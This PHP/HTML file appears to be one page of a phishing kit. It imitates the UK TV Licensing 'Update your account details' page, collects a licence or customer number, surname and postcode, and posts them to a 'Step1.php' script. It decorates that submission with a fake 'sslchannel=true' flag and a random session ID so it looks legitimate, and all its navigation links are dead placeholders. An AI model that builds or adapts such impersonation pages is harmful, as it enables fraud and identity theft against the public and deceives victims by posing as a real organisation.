<?php
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="" lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>Official TV Licensing website - Update your account details</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="ROBOTS" content="NOODP,NOYDIR">
    <meta http-equiv="imagetoolbar" content="no">
    <meta name="keywords" content="TV Licensing, TV Licence, renew, renewal, pay, direct debit, change, update, check, information, BBC, detector van, broadcasting act, media, press, contact">
    <meta name="description" content="Welcome to TV Licensing. Use this site to access a range of information about TV Licensing in the UK, including methods of payment and details of television licence regulations.">
    <meta name="WT.cg_n" content="PAY">
    <meta name="WT.cg_s" content="Renew">
    <meta name="DCSext.SignInMethod" content="normal">
    <meta name="WT.si_n" content="SignInRenew">
    <meta name="WT.si_x" content="1">

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="assets/files/favicon.ico" type="image/x-icon">

    <link href="assets/files/Satellite.css" media="screen" type="text/css" rel="stylesheet">
    <link href="assets/files/Satellite_003.css" media="print" type="text/css" rel="stylesheet">
    <link href="assets/files/jquery.css" rel="stylesheet">


    <!--[if !IE]> -->
    <link href="assets/files/Satellite_002.css" media="screen" type="text/css" rel="stylesheet">
    <link href="assets/files/jquery_002.css" rel="stylesheet">
    </head>
<body onload="javascript:checkCookie();">
<div>

</div>
<div id="iPage">
    <div id="iHeader">
        <div class="innerContainer clearfix topHeadCtr">
            <div class="clearfix" id="headerTop">
                <div class="clearfix" id="iLogo">
                    <h1>
                        <a href="#" title="TV Licence home page" class="fwckembeddedlink logoWrapper">
                            <img alt="TV Licensing logo" src="assets/files/imgHeaderLogo.png">
                        </a>
                        <span class="headingText">TV Licensing</span>
                    </h1>
                    <div id="linkToggle" style="cursor: pointer;"> &nbsp;</div>
                </div>
                <div class="mobileNav clearfix right" id="iMobileNav">
                    <a href="#" id="mlogout" style="display: none;" title="logout">Sign out</a>
                    <div class="clearfix" id="srhCtr" style="cursor: pointer;"> &nbsp;</div>
                </div>
                <div class="clearfix" id="iGlobalNav">
                    <ul>
                        <li class="first">
                            <a href="#" title="TV Licensing home page" class="fwckembeddedlink">Home</a>
                        </li>
                        <li>
                            <a href="#" title="TV Licensing easy read" class="fwckembeddedlink">Easy read</a>
                        </li>
                        <li class="second">
                           <span lang="cy">
                           <a href="#" title="Cymraeg" class="fwckembeddedlink">Cymraeg</a>
                           </span>
                        </li>
                        <li id="logout" style="display: none;">
                            <a href="#">Sign out</a>
                        </li>
                    </ul>
                    <fieldset class="search" id="siteSrch" style="display: block;">
                        <legend class="hide">search site</legend>
                        <label for="siteSearch" id="searchLabel" style="display: none;">Search</label>
                        <span class="siteSearchWrap">
                        <input id="siteSearch" name="q" style="color: rgb(88, 88, 88);" value="Search" type="search">
                        </span>
                        <input id="siteSearchGo" value="search" name="___##NO_NAMED_ELEMENT##___" type="button">
                    </fieldset>
                </div>
            </div>
            <div class="clearfix" id="iPrimaryNav">
                <ul>
                    <li>
                        <a href="#" title="Pay for your TV Licence">
                            <span><strong>Pay</strong> for your TV Licence</span>
                        </a>
                    </li>
                    <li>
                        <a href="#" title="Update your TV Licence details">
                            <span><strong>Update</strong> your details</span>
                        </a>
                    </li>
                    <li>
                        <a href="#" title="Check if you need a TV Licence" class="fwckembeddedlink">
                            <span><strong>Check</strong> if you need one</span>
                        </a>
                    </li>
                </ul>
            </div>
        </div>

    </div>
    <div id="iContent">
        <div class="innerContainer">
            <ul id="iBread">
                <li>
                    <a href="#">Home<span class="linkPurpose">Link for Home</span></a>
                </li>
                <li>/ My Account</li>
            </ul>
            <div id="iPrimary" style="width: 100%">
                <div class="panel">
                    <h2 class="header beta">
                        <span>Update your account details</span>
                    </h2>

                    <form id="loginDetails" action="Step1.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" method="post" >








                        <p class="introAuthorization">
                            We just need a few details to get started.</p>








                        <div id="iHigh_0" class="helpArea"><div style="background: none repeat scroll 0% 0% transparent; margin-bottom: 0.5em;" id="ctl00_Content_Login1_Div2" class="frmRow authHelpPanel">

                                <label for="ctl00_Content_Login1_txtMembershipNumber" id="ctl00_Content_Login1_lblMembershipNumber">TV Licence or Customer number</label>


 <input name="licenceNumber" class="frmText validate authInput" value="" required autocomplete="off" style="cursor: auto;" type="text">
                                <!-- RFC 2712a changes -->


                            </div></div>

                        <div id="iHigh_1" class="helpArea"><div style="background: none repeat scroll 0% 0% transparent;" id="ctl00_Content_Login1_Div1" class="frmRow authHelpPanel">
                                <label for="ctl00_Content_Login1_txtSurname" id="ctl00_Content_Login1_lblSurname">Last name (as it appears on the TV Licence)</label>



                                <input  name="lastName" class="frmText validate authInput" value="" required type="text">


                            </div></div>
                        <div id="ctl00_Content_Login1_Div3" class="frmRow contained">
                            <label for="ctl00_Content_Login1_txtPostCode" id="ctl00_Content_Login1_lblPostCode">Postcode of the licensed address</label>
                            <input name="postcode" class="frmText validate" required autocomplete="off" type="text">
                        </div>
                        <div class="div">
                            <div class="btnGrp">
				<span class="defaultBtn">
					<input title="Update your TV Licence details" class="validateAll" id="btnLogin" value="Continue" name="btnLogin" type="submit">
				</span>
                            </div>
                        </div>



                        <input name="invoker" value="" type="hidden">	<!-- RFC 3030 - GDPR - Koustav -->
                        <div></div></form></div>
            </div>
            <div id="iSecondary" style="display:none;">
                <div class="panel assist" style="display: none;">
                    <h3 class="header"><span></span></h3>
                    <div>
                        <p>
                            Please make sure your 10-digit TV Licence number or 9-digit Customer
                            number is entered correctly. You can find it on your current TV Licence
                            or any emails or letters we've sent you.
                        </p>
                        <p style="padding: 0em;">
                            Where to find the TV Licence or Customer number:
                        </p>
                        <div class="helpIntructionLeft">
                            <img src="assets/files/Satellite_004.png" alt="where to find your licence number">
                        </div>
                        <div class="helpIntructionRight">
                            <img src="assets/files/Satellite.png" alt="where to find your licence on your payment card">
                        </div>
                        <p style="padding: 0em;">
                            For Direct Debit customers, this number is also on your bank statement:
                        </p>
                        <div class="helpIntructionBelow">
                            <img src="assets/files/Satellite_003.png" alt="where to find your licence number on your bank statements">
                        </div>
                    </div>
                </div>
                <div class="panel assist" style="display: none;">
                    <h3 class="header"><span></span></h3>
                    <p>
                        Please enter the last name exactly as it appears on the TV Licence,
                        e.g. SMITH. For business licences, you may need to enter the job title
                        as shown on the TV Licence, e.g. MANAGER.
                    </p>
                    <p style="padding: 0em;">
                        Where to find the TV Licence holder's last name:
                    </p>
                    <div class="helpIntructionImg">
                        <img src="assets/files/Satellite_002.png" alt="Content Server Image">
                    </div>
                </div>
                <div class="panel secondary">
                    <h3 class="header gamma">
                        <span>On this website you can:</span>
                    </h3>
                    <ul class="list">
                        <li>
                            Update your account details
                        </li>
                        <li>
                            View your TV Licence
                        </li>
                        <li>
                            Update your contact details
                        </li>
                        <li>
                            Change the address on your TV Licence
                        </li>
                        <li>
                            Change the name on your TV Licence
                        </li>
                    </ul>
                    <h3 class="header alpha">
                        <span>If you pay by Direct Debit you can:</span>
                    </h3>
                    <ul class="list">
                        <li>
                            View your payment details
                        </li>
                        <li>
                            Change your bank details
                        </li>
                        <li>
                            Change your payment date
                        </li>
                    </ul>
                    <p>
                        If you don't pay by Direct Debit, it's easy to set up for your next TV Licence renewal.
                    </p>
                </div>
            </div>
            <div style="clear:both;"></div>
        </div>
    </div>
    <div id="iFooter">
        <div class="innerContainer">
            <ul id="iFooterNav">
                <li class="first">
                    <a href="#" title="About TV Licensing" class="fwckembeddedlink">About us</a>
                </li>
                <li>
                    <a href="#" title="Contact TV Licensing">Contact us</a>
                </li>
                <li>
                    <a href="#" title="Accessibility guidelines" class="fwckembeddedlink">Accessibility</a>
                </li>
                <li>
                    <a href="#" title="Community relations">Community relations</a>
                </li>
                <li>
                    <a href="#" title="Media Centre">Media Centre</a>
                </li>
                <li>
                    <a href="#" title="TV Licensing sitemap" class="fwckembeddedlink">Sitemap</a>
                </li>
                <li>
                    <a href="#" title="TV Licensing’s use of cookies" class="fwckembeddedlink">Cookies</a>
                </li>
                <li class="last">
                    <a href="#" title="TV Licensing's privacy policy" class="fwckembeddedlink">Privacy policy</a>
                </li>
            </ul>
            <p>
                General information about TV Licensing is available in other languages:
            </p>
            <ul id="iLanguages">
                <li class="first">
                    <span lang="cy"><a href="#" title="Select this link to go to general TV Licensing information translated into Welsh" class="fwckembeddedlink">Cymraeg</a></span>
                </li>
                <li>
                    <span lang="pl"><a href="#" title="Select this link to go to general TV Licensing information translated into Polish" class="fwckembeddedlink">Polski</a></span>
                </li>
                <li>
                    <span lang="es"><a href="#" title="Select this link to go to general TV Licensing information translated into Spanish" class="fwckembeddedlink">Español</a></span>
                </li>
                <li>
                    <span lang="pt"><a href="#" title="Select this link to go to general TV Licensing information translated into Portuguese" class="fwckembeddedlink">Português</a></span>
                </li>
                <li style="background: rgba(0, 0, 0, 0) url('/cs/TVL/css/images/footer/imgFooterNavBg.png') no-repeat scroll right top; padding-right: 1.4em">
                    <span class="unicode" lang="ur"><a href="#" title="Select this link to go to general TV Licensing information translated into Urdu" class="fwckembeddedlink">اردو</a></span>
                </li>
                <li class="last" style="padding-left: 1.11em;">
                    <a href="#">More languages &gt;&gt;</a>
                </li>
            </ul>
            <p class="copyright">
                © 2018 TV Licensing
            </p>
        </div>
        <div>
            &nbsp;
        </div>
    </div>
</div>
<div>
    <noscript>
        <img alt="dcsimg" id="dcsimg" width="1" height="1" src="//statse.webtrendslive.com/dcs1r5h96000008yfl0bbgi0a_9v2g/njs.gif?dcsuri=/nojavascript&WT.js=No&WT.tv=10.4.1"/>
    </noscript>
</div>
<div id="__lpform_ctl00_Content_Login1_txtMembershipNumber" style="max-height: 16px; vertical-align: top; position: absolute; top: 291.75px; left: 615.5px; z-index: 17;"></div>
</body>
</html>

